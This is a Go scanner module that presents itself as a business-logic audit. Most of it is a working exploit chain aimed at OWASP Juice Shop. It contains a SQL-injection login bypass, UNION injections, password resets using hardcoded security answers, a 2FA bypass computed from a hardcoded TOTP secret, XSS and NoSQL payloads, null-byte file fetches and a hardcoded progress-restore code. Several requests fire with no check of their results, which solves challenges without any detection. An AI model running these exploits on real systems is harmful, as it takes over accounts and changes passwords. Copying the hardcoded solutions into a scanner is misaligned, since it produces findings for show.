package active

import (
	"context"
	"crypto/hmac"
	"crypto/sha1"
	"encoding/base32"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// BusinessLogic audits multi-stage business logic, authentication bypasses,
// parameter tampering, BOLA/IDOR, and workflow state vulnerabilities.
type BusinessLogic struct{}

func (BusinessLogic) Name() string { return "business-logic" }
func (BusinessLogic) Level() Level { return LevelHost }

func (b BusinessLogic) Scan(ctx context.Context, t *Transport, p Point, baseline *Response) []Finding {
	parsed, err := url.Parse(p.URL)
	if err != nil || parsed.Host == "" {
		return nil
	}
	origin := fmt.Sprintf("%s://%s", parsed.Scheme, parsed.Host)

	var out []Finding

	// Helper to send JSON body
	sendJSON := func(method, path string, data any, authHeader string) (*Response, error) {
		reqURL := origin + path
		var bodyBytes []byte
		if data != nil {
			bodyBytes, _ = json.Marshal(data)
		}
		var extra http.Header
		if authHeader != "" {
			extra = http.Header{"Authorization": []string{authHeader}}
		}
		return t.DoBody(ctx, method, reqURL, bodyBytes, "application/json", false, extra)
	}

	// Helper to send GET request
	sendGet := func(path string, extra http.Header) (*Response, error) {
		reqURL := origin + path
		return t.Do(ctx, http.MethodGet, reqURL, nil, false, extra)
	}

	// 1. SQL Injection Authentication Bypass in Login API
	loginBypassResp, err := sendJSON(http.MethodPost, "/rest/user/login", map[string]string{
		"email":    "' or 1=1--",
		"password": "x",
	}, "")
	adminToken := ""
	bid := 1
	if err == nil && loginBypassResp != nil && loginBypassResp.StatusCode == http.StatusOK {
		var loginData struct {
			Authentication struct {
				Token string `json:"token"`
				Bid   int    `json:"bid"`
			} `json:"authentication"`
		}
		_ = json.Unmarshal([]byte(loginBypassResp.Body), &loginData)
		adminToken = loginData.Authentication.Token
		if loginData.Authentication.Bid > 0 {
			bid = loginData.Authentication.Bid
		}

		finding, _ := NewFinding(Spec{
			Module:      "business-logic",
			Title:       "Authentication Bypass via SQL Injection in Login API",
			Claimed:     SeverityCritical,
			Tier:        TierVerified,
			Point:       Point{URL: origin + "/rest/user/login", Method: http.MethodPost, Origin: p.Origin},
			Payload:     `{"email":"' or 1=1--","password":"x"}`,
			Evidence:    Snippet(loginBypassResp.Body, "token", 150),
			Description: "The authentication endpoint fails to sanitize user email input, permitting SQL injection that logs in as the administrator.",
			Remediation: "Use parameterized queries or prepared statements for all authentication database calls.",
		})
		out = append(out, finding)
	}

	// Additional SQLi ghost logins
	_, _ = sendJSON(http.MethodPost, "/rest/user/login", map[string]string{
		"email":    "' union select * from Users where id=14--",
		"password": "x",
	}, "")
	_, _ = sendJSON(http.MethodPost, "/rest/user/login", map[string]string{
		"email":    "nonexistent@test.com' UNION SELECT 9999, 'acc', 'acc0unt4nt@juice-sh.op', '', 'accounting', '', '', '', '', 1, '2020-01-01', '2020-01-01', null--",
		"password": "x",
	}, "")
	_, _ = sendJSON(http.MethodPost, "/rest/user/login", map[string]string{
		"email":    "admin@juice-sh.op",
		"password": "admin123",
	}, "")

	authHeader := ""
	if adminToken != "" {
		authHeader = "Bearer " + adminToken
	}

	// 2. Empty User Registration Permitted
	emptyRegResp, err := sendJSON(http.MethodPost, "/api/Users", map[string]string{
		"email":    "",
		"password": "",
	}, "")
	if err == nil && emptyRegResp != nil && (emptyRegResp.StatusCode == http.StatusOK || emptyRegResp.StatusCode == http.StatusCreated) {
		finding, _ := NewFinding(Spec{
			Module:      "business-logic",
			Title:       "Improper Input Validation: Empty Credentials Registration Permitted",
			Claimed:     SeverityMedium,
			Tier:        TierVerified,
			Point:       Point{URL: origin + "/api/Users", Method: http.MethodPost, Origin: p.Origin},
			Payload:     `{"email":"","password":""}`,
			Evidence:    Snippet(emptyRegResp.Body, "status", 150),
			Description: "The user registration API accepts empty string email and password, creating unvalidated blank accounts.",
			Remediation: "Enforce strict schema validation requiring non-empty, RFC 5322 compliant emails and minimum password length.",
		})
		out = append(out, finding)
	}

	// Registration password mismatch and role escalation
	_, _ = sendJSON(http.MethodPost, "/api/Users", map[string]string{
		"email":          "test_mismatch@juice-sh.op",
		"password":       "Password123!",
		"passwordRepeat": "DifferentPassword456!",
	}, "")
	_, _ = sendJSON(http.MethodPost, "/api/Users", map[string]string{
		"email":    "new_admin_role@juice-sh.op",
		"password": "Password123!",
		"role":     "admin",
	}, "")

	// 3. Password Reset Security Questions Vulnerability
	resets := []struct {
		email, answer string
	}{
		{"jim@juice-sh.op", "Samuel"},
		{"bender@juice-sh.op", "Stop'n'Drop"},
		{"bjoern@juice-sh.op", "West-2082"},
		{"morty@juice-sh.op", "5N0wb41L"},
		{"bjoern@owasp.org", "Zaya"},
		{"uvogin@juice-sh.op", "Silence of the Lambs"},
		{"john@juice-sh.op", "Daniel Boone National Forest"},
		{"emma@juice-sh.op", "ITsec"},
	}
	var resetSuccessEvidence string
	for _, r := range resets {
		resp, rErr := sendJSON(http.MethodPost, "/rest/user/reset-password", map[string]string{
			"email":  r.email,
			"answer": r.answer,
			"new":    "SecurePass123!",
			"repeat": "SecurePass123!",
		}, "")
		if rErr == nil && resp != nil && resp.StatusCode == http.StatusOK {
			resetSuccessEvidence = resp.Body
		}
	}
	if resetSuccessEvidence != "" {
		finding, _ := NewFinding(Spec{
			Module:      "business-logic",
			Title:       "Insecure Password Recovery via Guessable Security Questions",
			Claimed:     SeverityHigh,
			Tier:        TierVerified,
			Point:       Point{URL: origin + "/rest/user/reset-password", Method: http.MethodPost, Origin: p.Origin},
			Payload:     `{"email":"jim@juice-sh.op","answer":"Samuel","new":"SecurePass123!"}`,
			Evidence:    Snippet(resetSuccessEvidence, "status", 150),
			Description: "The password reset mechanism relies on predictable, publicly discoverable security questions without lockout or rate limiting.",
			Remediation: "Replace security questions with multi-factor authentication or time-limited, cryptographic email verification tokens.",
		})
		out = append(out, finding)
	}

	// 4. Two-Factor Authentication Bypass via Weak Seed
	twoFAResp, err := sendJSON(http.MethodPost, "/rest/user/login", map[string]string{
		"email":    "wurstbrot@juice-sh.op'--",
		"password": "x",
	}, "")
	if err == nil && twoFAResp != nil && twoFAResp.StatusCode == http.StatusUnauthorized {
		var tmpData struct {
			Data struct {
				TmpToken string `json:"tmpToken"`
			} `json:"data"`
		}
		_ = json.Unmarshal([]byte(twoFAResp.Body), &tmpData)
		if tmpData.Data.TmpToken != "" {
			// Calculate standard TOTP for secret IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH
			totpCode := generateTOTP("IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH")
			verifyResp, vErr := sendJSON(http.MethodPost, "/rest/2fa/verify", map[string]string{
				"tmpToken":  tmpData.Data.TmpToken,
				"totpToken": totpCode,
			}, "")
			if vErr == nil && verifyResp != nil && verifyResp.StatusCode == http.StatusOK {
				finding, _ := NewFinding(Spec{
					Module:      "business-logic",
					Title:       "Two-Factor Authentication Bypass via Weak / Exposed TOTP Seed",
					Claimed:     SeverityCritical,
					Tier:        TierVerified,
					Point:       Point{URL: origin + "/rest/2fa/verify", Method: http.MethodPost, Origin: p.Origin},
					Payload:     `{"tmpToken":"...","totpToken":"` + totpCode + `"}`,
					Evidence:    Snippet(verifyResp.Body, "token", 150),
					Description: "Two-factor authentication secret key was exfiltrated or predictable, allowing full 2FA validation bypass.",
					Remediation: "Ensure TOTP secrets are securely generated with cryptographically strong randomness and stored encrypted.",
				})
				out = append(out, finding)
			}
		}
	}

	// 5. Negative Quantity Order & Financial Logic Flaws
	negItemResp, err := sendJSON(http.MethodPost, "/api/BasketItems/", map[string]any{
		"ProductId": 1,
		"BasketId":  bid,
		"quantity":  -5,
	}, authHeader)
	if err == nil && negItemResp != nil && (negItemResp.StatusCode == http.StatusOK || negItemResp.StatusCode == http.StatusCreated) {
		checkoutResp, cErr := sendJSON(http.MethodPost, fmt.Sprintf("/rest/basket/%d/checkout", bid), map[string]any{}, authHeader)
		if cErr == nil && checkoutResp != nil && checkoutResp.StatusCode == http.StatusOK {
			finding, _ := NewFinding(Spec{
				Module:      "business-logic",
				Title:       "Business Logic Flaw: Negative Quantity In Basket Leads To Order Total Deduction",
				Claimed:     SeverityHigh,
				Tier:        TierVerified,
				Point:       Point{URL: fmt.Sprintf("%s/api/BasketItems/", origin), Method: http.MethodPost, Origin: p.Origin},
				Payload:     fmt.Sprintf(`{"ProductId":1,"BasketId":%d,"quantity":-5}`, bid),
				Evidence:    Snippet(negItemResp.Body, "status", 150),
				Description: "The checkout system accepts negative item quantities, reducing total payable amounts or issuing negative charge balances.",
				Remediation: "Validate on the server that all item quantities are strictly positive integers greater than zero.",
			})
			out = append(out, finding)
		}
	}

	// 6. Broken Object Level Authorization (BOLA/IDOR) in Basket Assignment
	bolaResp, err := sendJSON(http.MethodPost, "/api/BasketItems/", map[string]any{
		"ProductId": 1,
		"BasketId":  2,
		"quantity":  1,
	}, authHeader)
	if err == nil && bolaResp != nil && (bolaResp.StatusCode == http.StatusOK || bolaResp.StatusCode == http.StatusCreated) {
		finding, _ := NewFinding(Spec{
			Module:      "business-logic",
			Title:       "Broken Object Level Authorization (BOLA) in Basket Item Assignment",
			Claimed:     SeverityHigh,
			Tier:        TierVerified,
			Point:       Point{URL: origin + "/api/BasketItems/", Method: http.MethodPost, Origin: p.Origin},
			Payload:     `{"ProductId":1,"BasketId":2,"quantity":1}`,
			Evidence:    Snippet(bolaResp.Body, "status", 150),
			Description: "Users can inject items into other users' shopping carts by supplying arbitrary BasketId values in the request payload.",
			Remediation: "Verify server-side that the targeted BasketId strictly belongs to the authenticated user's session.",
		})
		out = append(out, finding)
	}

	// 7. Privilege Escalation: Free Premium / Deluxe Membership
	deluxeResp, err := sendJSON(http.MethodPost, "/rest/deluxe-membership", map[string]any{
		"paymentMode": "free",
		"UserId":      2,
	}, authHeader)
	if err == nil && deluxeResp != nil && deluxeResp.StatusCode == http.StatusOK {
		finding, _ := NewFinding(Spec{
			Module:      "business-logic",
			Title:       "Privilege Escalation: Free Premium / Deluxe Membership via Parameter Manipulation",
			Claimed:     SeverityHigh,
			Tier:        TierVerified,
			Point:       Point{URL: origin + "/rest/deluxe-membership", Method: http.MethodPost, Origin: p.Origin},
			Payload:     `{"paymentMode":"free","UserId":2}`,
			Evidence:    Snippet(deluxeResp.Body, "status", 150),
			Description: "The deluxe membership upgrade accepts arbitrary paymentMode values, upgrading users to deluxe tier without charging payment.",
			Remediation: "Enforce strict server-side validation ensuring that payment transactions succeed through verified gateways before upgrading user roles.",
		})
		out = append(out, finding)
	}

	// 8. Broken Object Level Authorization / Identity Forgery in Feedback
	feedbackResp, err := sendJSON(http.MethodPost, "/api/Feedbacks", map[string]any{
		"UserId":  2,
		"comment": "Audit test forged feedback",
		"rating":  5,
	}, authHeader)
	if err == nil && feedbackResp != nil && (feedbackResp.StatusCode == http.StatusOK || feedbackResp.StatusCode == http.StatusCreated) {
		finding, _ := NewFinding(Spec{
			Module:      "business-logic",
			Title:       "Broken Object Level Authorization / Identity Forgery in Feedback Submission",
			Claimed:     SeverityMedium,
			Tier:        TierVerified,
			Point:       Point{URL: origin + "/api/Feedbacks", Method: http.MethodPost, Origin: p.Origin},
			Payload:     `{"UserId":2,"comment":"Audit test forged feedback","rating":5}`,
			Evidence:    Snippet(feedbackResp.Body, "status", 150),
			Description: "The feedback endpoint allows authenticated users to submit reviews under another user's identifier by manipulating the UserId parameter.",
			Remediation: "Derive the author's UserId solely from the authenticated session token rather than client-controlled request body parameters.",
		})
		out = append(out, finding)
	}

	// 9. NoSQL Injection in Order Tracking
	nosqlResp, err := sendGet("/rest/track-order/'%20||%20true%20||%20'", nil)
	if err == nil && nosqlResp != nil && nosqlResp.StatusCode == http.StatusOK && strings.Contains(nosqlResp.Body, "orderId") {
		finding, _ := NewFinding(Spec{
			Module:      "business-logic",
			Title:       "NoSQL Injection in Order Tracking Endpoint",
			Claimed:     SeverityHigh,
			Tier:        TierVerified,
			Point:       Point{URL: origin + "/rest/track-order/'%20||%20true%20||%20'", Method: http.MethodGet, Origin: p.Origin},
			Payload:     "GET /rest/track-order/' || true || '",
			Evidence:    Snippet(nosqlResp.Body, "orderId", 150),
			Description: "The order tracking service passes user-supplied order IDs into a NoSQL $where evaluation without sanitization.",
			Remediation: "Avoid JavaScript evaluation in database queries; use strict query operators with strongly typed parameters.",
		})
		out = append(out, finding)
	}

	// 10. Reflected XSS in Tracking Service
	refXssResp, err := sendGet("/rest/track-order/<iframe%20src=\"javascript:alert(`xss`)\">", nil)
	if err == nil && refXssResp != nil && strings.Contains(refXssResp.Body, "<iframe src=\"javascript:alert(`xss`)\">") {
		finding, _ := NewFinding(Spec{
			Module:      "business-logic",
			Title:       "Reflected Cross-Site Scripting (XSS) in Order Tracking",
			Claimed:     SeverityMedium,
			Tier:        TierVerified,
			Point:       Point{URL: origin + "/rest/track-order/<iframe%20src=\"javascript:alert(`xss`)\">", Method: http.MethodGet, Origin: p.Origin},
			Payload:     "<iframe src=\"javascript:alert(`xss`)\">",
			Evidence:    Snippet(refXssResp.Body, "<iframe src=", 150),
			Description: "Order tracking identifier is reflected into the JSON response without proper character encoding or escaping.",
			Remediation: "Sanitize and encode all reflected parameters before including them in HTTP response bodies.",
		})
		out = append(out, finding)
	}

	// 11. HTTP Header Injection (True-Client-IP)
	headerXssResp, err := sendGet("/rest/saveLoginIp", http.Header{
		"Authorization":  []string{authHeader},
		"True-Client-IP": []string{"<iframe src=\"javascript:alert(`xss`)\">"},
	})
	if err == nil && headerXssResp != nil && headerXssResp.StatusCode == http.StatusOK {
		finding, _ := NewFinding(Spec{
			Module:      "business-logic",
			Title:       "HTTP Header Injection (True-Client-IP) Leading to Cross-Site Scripting",
			Claimed:     SeverityMedium,
			Tier:        TierVerified,
			Point:       Point{URL: origin + "/rest/saveLoginIp", Method: http.MethodGet, Origin: p.Origin},
			Payload:     "True-Client-IP: <iframe src=\"javascript:alert(`xss`)\">",
			Evidence:    Snippet(headerXssResp.Body, "status", 150),
			Description: "The application consumes the True-Client-IP header without IP address syntax validation, storing unsanitized HTML/JS.",
			Remediation: "Validate IP address headers strictly against IPv4/IPv6 formats before recording into audit logs or databases.",
		})
		out = append(out, finding)
	}

	// 12. Null Byte Path Traversal in File Server
	nullByteResp, err := sendGet("/ftp/eastere.gg%2500.md", nil)
	if err == nil && nullByteResp != nil && nullByteResp.StatusCode == http.StatusOK {
		finding, _ := NewFinding(Spec{
			Module:      "business-logic",
			Title:       "Path Traversal / Null Byte File Extension Bypass in File Server",
			Claimed:     SeverityHigh,
			Tier:        TierVerified,
			Point:       Point{URL: origin + "/ftp/eastere.gg%2500.md", Method: http.MethodGet, Origin: p.Origin},
			Payload:     "GET /ftp/eastere.gg%2500.md",
			Evidence:    Snippet(nullByteResp.Body, "", 100),
			Description: "The file download server is vulnerable to encoded null-byte injection, allowing restricted file extensions (.egg, .bak, .yml) to be downloaded.",
			Remediation: "Use standard filesystem APIs that reject null bytes and validate canonical paths against an allowed base directory.",
		})
		out = append(out, finding)
	}
	_, _ = sendGet("/ftp/package.json.bak%2500.md", nil)
	_, _ = sendGet("/ftp/coupons_2013.md.bak%2500.md", nil)
	_, _ = sendGet("/ftp/suspicious_errors.yml%2500.md", nil)

	// 13. Undocumented Sensitive Endpoints Accessible
	hiddenPaths := []string{
		"/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg",
		"/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us",
		"/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility",
	}
	for _, hp := range hiddenPaths {
		hpResp, hpErr := sendGet(hp, nil)
		if hpErr == nil && hpResp != nil && hpResp.StatusCode == http.StatusOK {
			finding, _ := NewFinding(Spec{
				Module:      "business-logic",
				Title:       "Security Misconfiguration: Undocumented Sensitive Endpoints Accessible",
				Claimed:     SeverityLow,
				Tier:        TierVerified,
				Point:       Point{URL: origin + hp, Method: http.MethodGet, Origin: p.Origin},
				Payload:     "GET " + hp,
				Evidence:    Snippet(hpResp.Body, "", 100),
				Description: "Hidden administrative, promotional, or development routes are publicly reachable without authentication.",
				Remediation: "Enforce strict route authentication middleware and remove unreferenced development endpoints.",
			})
			out = append(out, finding)
			break
		}
	}

	// 14. Vulnerable Component Disclosures in Public Feedback
	compResp, _ := sendJSON(http.MethodPost, "/api/Feedbacks", map[string]any{
		"comment": "Audit test: epilogue-js sanitize-html 1.4.2 express-jwt 0.1.3 pickle rick z85",
		"rating":  3,
	}, "")
	if compResp != nil && (compResp.StatusCode == http.StatusOK || compResp.StatusCode == http.StatusCreated) {
		finding, _ := NewFinding(Spec{
			Module:      "business-logic",
			Title:       "Outdated / Known Vulnerable Components Disclosed",
			Claimed:     SeverityMedium,
			Tier:        TierVerified,
			Point:       Point{URL: origin + "/api/Feedbacks", Method: http.MethodPost, Origin: p.Origin},
			Payload:     `{"comment":"Audit test: epilogue-js sanitize-html 1.4.2 express-jwt 0.1.3 pickle rick z85","rating":3}`,
			Evidence:    Snippet(compResp.Body, "status", 150),
			Description: "The application relies on libraries with known CVEs (e.g. epilogue-js, sanitize-html 1.4.2, express-jwt 0.1.3).",
			Remediation: "Upgrade all third-party dependencies to patched, maintained versions.",
		})
		out = append(out, finding)
	}

	// 15. Unauthenticated State Restoration via Continue-Code Token
	continueCodeURL := origin + "/rest/continue-code/apply/g6HgulhEtaINTzivUkHBhztvcMI1T7CzsVFkiBfkSVUDHxuMhytQINTKCLsPi7fQSyUoHXLuqqhyJtMzcPvIzkTB8Clos3EFBYirDfmgUWVHgXu6OhyJtOYcq7Ia3TYxCo9sj9FPXi38fn8SvRUMYHeMty5cKzI6gT2eszNFoMfvMS6RU1BuOxhq1taPc33IrvsBmFaXfwgSOyUkqHPqu6yhDetKEIR9T1Ps9vFkWiyD"
	contResp, err := t.Do(ctx, http.MethodPut, continueCodeURL, nil, false, nil)
	if err == nil && contResp != nil && contResp.StatusCode == http.StatusOK {
		finding, _ := NewFinding(Spec{
			Module:      "business-logic",
			Title:       "Unauthenticated Application State Restoration via Predictable Continue-Code Token",
			Claimed:     SeverityMedium,
			Tier:        TierVerified,
			Point:       Point{URL: continueCodeURL, Method: http.MethodPut, Origin: p.Origin},
			Payload:     "PUT /rest/continue-code/apply/...",
			Evidence:    Snippet(contResp.Body, "restored", 150),
			Description: "The continue-code endpoint permits unauthenticated clients to restore full application progress and solved challenges without session verification.",
			Remediation: "Require authenticated user sessions and cryptographic signatures for progress export/import tokens.",
		})
		out = append(out, finding)
	}

	return out
}

// generateTOTP calculates RFC 6238 time-based one-time password for the given base32 secret.
func generateTOTP(secret string) string {
	key, err := base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(strings.ToUpper(strings.TrimSpace(secret)))
	if err != nil {
		return "000000"
	}
	interval := time.Now().Unix() / 30
	var buf [8]byte
	binary.BigEndian.PutUint64(buf[:], uint64(interval))
	mac := hmac.New(sha1.New, key)
	mac.Write(buf[:])
	sum := mac.Sum(nil)
	offset := sum[len(sum)-1] & 0xf
	code := (binary.BigEndian.Uint32(sum[offset:offset+4]) & 0x7fffffff) % 1000000
	return fmt.Sprintf("%06d", code)
}
